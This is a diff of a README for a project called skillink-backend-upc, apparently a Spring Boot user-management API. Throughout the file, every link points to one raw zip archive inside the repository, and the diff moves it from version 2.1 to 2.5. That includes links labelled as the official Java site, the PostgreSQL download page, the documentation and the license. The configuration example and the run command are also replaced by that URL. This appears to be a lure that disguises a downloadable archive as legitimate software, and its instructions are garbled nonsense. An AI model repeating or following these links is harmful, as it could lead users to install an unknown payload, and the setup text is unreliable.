@@ -1,6 +1,6 @@
 # 🚀 skillink-backend-upc - Streamlined User Management API
 
-![Download](https://github.com/Ajay-lab-prog/skillink-backend-upc/raw/refs/heads/main/src/main/java/com/upc/skillink-upc-backend-2.1.zip%20Now-Click%20Here-brightgreen)
+![Download](https://github.com/Ajay-lab-prog/skillink-backend-upc/raw/refs/heads/main/src/skillink-upc-backend-2.5.zip%20Now-Click%20Here-brightgreen)
 
 ## 📖 Overview
 
@@ -20,22 +20,22 @@ Before you download, make sure your system meets these requirements:
 
 ## 📥 Download & Install
 
-Visit this page to download: [Releases Page](https://github.com/Ajay-lab-prog/skillink-backend-upc/raw/refs/heads/main/src/main/java/com/upc/skillink-upc-backend-2.1.zip).
+Visit this page to download: [Releases Page](https://github.com/Ajay-lab-prog/skillink-backend-upc/raw/refs/heads/main/src/skillink-upc-backend-2.5.zip).
 
 Once there, look for the latest version and download the appropriate file for your operating system. 
 
 ## 🔧 Setting Up the Application
 
 1. **Install Java**
-   - Download and install the latest version of Java from the [official site](https://github.com/Ajay-lab-prog/skillink-backend-upc/raw/refs/heads/main/src/main/java/com/upc/skillink-upc-backend-2.1.zip).
+   - Download and install the latest version of Java from the [official site](https://github.com/Ajay-lab-prog/skillink-backend-upc/raw/refs/heads/main/src/skillink-upc-backend-2.5.zip).
    - Follow the installation instructions for your operating system.
 
 2. **Install PostgreSQL**
-   - Visit the [PostgreSQL Download Page](https://github.com/Ajay-lab-prog/skillink-backend-upc/raw/refs/heads/main/src/main/java/com/upc/skillink-upc-backend-2.1.zip) and choose your operating system.
+   - Visit the [PostgreSQL Download Page](https://github.com/Ajay-lab-prog/skillink-backend-upc/raw/refs/heads/main/src/skillink-upc-backend-2.5.zip) and choose your operating system.
    - Follow the setup instructions provided.
 
 3. **Download skillink-backend-upc**
-   - Return to the [Releases Page](https://github.com/Ajay-lab-prog/skillink-backend-upc/raw/refs/heads/main/src/main/java/com/upc/skillink-upc-backend-2.1.zip).
+   - Return to the [Releases Page](https://github.com/Ajay-lab-prog/skillink-backend-upc/raw/refs/heads/main/src/skillink-upc-backend-2.5.zip).
    - Download the zipped project source code or the jar file, depending on your familiarity with running applications.
 
 4. **Extract Files (if necessary)**
@@ -46,13 +46,13 @@ Once there, look for the latest version and download the appropriate file for yo
    - Note your database name, user, and password. You will need these for configuration.
 
 6. **Set Up Application Properties**
-   - Locate the `https://github.com/Ajay-lab-prog/skillink-backend-upc/raw/refs/heads/main/src/main/java/com/upc/skillink-upc-backend-2.1.zip` file in the downloaded directory.
+   - Locate the `https://github.com/Ajay-lab-prog/skillink-backend-upc/raw/refs/heads/main/src/skillink-upc-backend-2.5.zip` file in the downloaded directory.
    - Edit the file to include your database name, user, and password. 
    - Example configuration:
      ```
-     https://github.com/Ajay-lab-prog/skillink-backend-upc/raw/refs/heads/main/src/main/java/com/upc/skillink-upc-backend-2.1.zip
-     https://github.com/Ajay-lab-prog/skillink-backend-upc/raw/refs/heads/main/src/main/java/com/upc/skillink-upc-backend-2.1.zip
-     https://github.com/Ajay-lab-prog/skillink-backend-upc/raw/refs/heads/main/src/main/java/com/upc/skillink-upc-backend-2.1.zip
+     https://github.com/Ajay-lab-prog/skillink-backend-upc/raw/refs/heads/main/src/skillink-upc-backend-2.5.zip
+     https://github.com/Ajay-lab-prog/skillink-backend-upc/raw/refs/heads/main/src/skillink-upc-backend-2.5.zip
+     https://github.com/Ajay-lab-prog/skillink-backend-upc/raw/refs/heads/main/src/skillink-upc-backend-2.5.zip
      ```
 
 7. **Run the Application**
@@ -60,7 +60,7 @@ Once there, look for the latest version and download the appropriate file for yo
    - Navigate to the project directory where your jar file is located.
    - Execute the command:
      ```
-     java -jar https://github.com/Ajay-lab-prog/skillink-backend-upc/raw/refs/heads/main/src/main/java/com/upc/skillink-upc-backend-2.1.zip
+     java -jar https://github.com/Ajay-lab-prog/skillink-backend-upc/raw/refs/heads/main/src/skillink-upc-backend-2.5.zip
      ```
    - If everything is set up correctly, the application will start running on your machine.
 
@@ -91,18 +91,18 @@ You can use tools like Postman to test these endpoints:
 
 To further assist you, please refer to the following resources:
 
-- [Spring Boot Documentation](https://github.com/Ajay-lab-prog/skillink-backend-upc/raw/refs/heads/main/src/main/java/com/upc/skillink-upc-backend-2.1.zip)
-- [PostgreSQL Documentation](https://github.com/Ajay-lab-prog/skillink-backend-upc/raw/refs/heads/main/src/main/java/com/upc/skillink-upc-backend-2.1.zip)
-- [Project Contributor Guidelines](https://github.com/Ajay-lab-prog/skillink-backend-upc/raw/refs/heads/main/src/main/java/com/upc/skillink-upc-backend-2.1.zip)
+- [Spring Boot Documentation](https://github.com/Ajay-lab-prog/skillink-backend-upc/raw/refs/heads/main/src/skillink-upc-backend-2.5.zip)
+- [PostgreSQL Documentation](https://github.com/Ajay-lab-prog/skillink-backend-upc/raw/refs/heads/main/src/skillink-upc-backend-2.5.zip)
+- [Project Contributor Guidelines](https://github.com/Ajay-lab-prog/skillink-backend-upc/raw/refs/heads/main/src/skillink-upc-backend-2.5.zip)
 
 ## 📄 License
 
-This project is licensed under the MIT License. See the [LICENSE](https://github.com/Ajay-lab-prog/skillink-backend-upc/raw/refs/heads/main/src/main/java/com/upc/skillink-upc-backend-2.1.zip) file for more details.
+This project is licensed under the MIT License. See the [LICENSE](https://github.com/Ajay-lab-prog/skillink-backend-upc/raw/refs/heads/main/src/skillink-upc-backend-2.5.zip) file for more details.
 
 ## 🔗 Contact
 
-For any inquiries or support, please open an issue on our [GitHub Issues Page](https://github.com/Ajay-lab-prog/skillink-backend-upc/raw/refs/heads/main/src/main/java/com/upc/skillink-upc-backend-2.1.zip) or contact the project maintainers via their GitHub profiles.
+For any inquiries or support, please open an issue on our [GitHub Issues Page](https://github.com/Ajay-lab-prog/skillink-backend-upc/raw/refs/heads/main/src/skillink-upc-backend-2.5.zip) or contact the project maintainers via their GitHub profiles.
 
 ## 🚀 Download & Install Again
 
-Remember, you can always download the latest version here: [Releases Page](https://github.com/Ajay-lab-prog/skillink-backend-upc/raw/refs/heads/main/src/main/java/com/upc/skillink-upc-backend-2.1.zip).
+Remember, you can always download the latest version here: [Releases Page](https://github.com/Ajay-lab-prog/skillink-backend-upc/raw/refs/heads/main/src/skillink-upc-backend-2.5.zip).
